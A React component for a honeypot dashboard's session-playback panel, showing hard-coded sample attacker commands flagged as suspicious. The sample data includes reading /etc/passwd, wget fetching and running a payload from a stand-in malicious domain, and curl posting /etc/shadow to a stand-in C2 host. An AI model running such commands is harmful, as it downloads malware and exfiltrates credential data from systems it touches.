import { Terminal, AlertTriangle, Play } from 'lucide-react';

interface SessionPlaybackProps {
  sessionId: string;
}

export function SessionPlayback({ sessionId }: SessionPlaybackProps) {
  const commands = [
    { time: '14:23:42', command: 'ssh root@honeypot -p 22', suspicious: false },
    { time: '14:23:45', command: 'whoami', suspicious: false },
    { time: '14:23:48', command: 'uname -a', suspicious: false },
    { time: '14:23:52', command: 'cat /etc/passwd', suspicious: true, reason: 'Credential harvesting' },
    { time: '14:23:58', command: 'wget http://malicious-domain.ru/payload.sh', suspicious: true, reason: 'Malware download' },
    { time: '14:24:03', command: 'chmod +x payload.sh', suspicious: true, reason: 'Execution preparation' },
    { time: '14:24:07', command: './payload.sh', suspicious: true, reason: 'Malicious execution' },
    { time: '14:24:12', command: 'curl -X POST https://c2-server.com/exfil -d @/etc/shadow', suspicious: true, reason: 'Data exfiltration' },
    { time: '14:24:18', command: 'netstat -tulpn', suspicious: false },
    { time: '14:24:24', command: 'ps aux | grep root', suspicious: false },
  ];

  return (
    <div className="bg-slate-900 rounded-lg border border-slate-800 overflow-hidden flex flex-col">
      <div className="px-6 py-4 border-b border-slate-800 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <Terminal className="w-5 h-5 text-green-400" />
          <h2 className="text-slate-100">Session Playback</h2>
          <span className="text-sm text-slate-500">({sessionId})</span>
        </div>
        <button className="flex items-center gap-2 px-3 py-1.5 bg-slate-800 border border-slate-700 rounded text-xs text-slate-300 hover:bg-slate-750 transition-colors">
          <Play className="w-3 h-3" />
          Replay
        </button>
      </div>

      <div className="flex-1 overflow-auto p-6 bg-slate-950 font-mono text-sm">
        <div className="space-y-2">
          {commands.map((cmd, idx) => (
            <div
              key={idx}
              className={`flex gap-4 p-2 rounded ${
                cmd.suspicious ? 'bg-red-500/10 border-l-2 border-red-500' : ''
              }`}
            >
              <span className="text-slate-500 text-xs shrink-0 pt-1">{cmd.time}</span>
              <div className="flex-1">
                <div className="flex items-start gap-2">
                  {cmd.suspicious && (
                    <AlertTriangle className="w-4 h-4 text-red-400 shrink-0 mt-0.5" />
                  )}
                  <span className={cmd.suspicious ? 'text-red-300' : 'text-green-400'}>
                    $ {cmd.command}
                  </span>
                </div>
                {cmd.suspicious && (
                  <div className="mt-1 ml-6 text-xs text-red-400/80">
                    ⚠ {cmd.reason}
                  </div>
                )}
              </div>
            </div>
          ))}
        </div>
      </div>

      <div className="px-6 py-3 border-t border-slate-800 bg-slate-900 flex items-center justify-between text-xs">
        <span className="text-slate-400">
          <span className="text-red-400">{commands.filter(c => c.suspicious).length}</span> suspicious commands detected
        </span>
        <span className="text-slate-500">Duration: 2m 42s</span>
      </div>
    </div>
  );
}
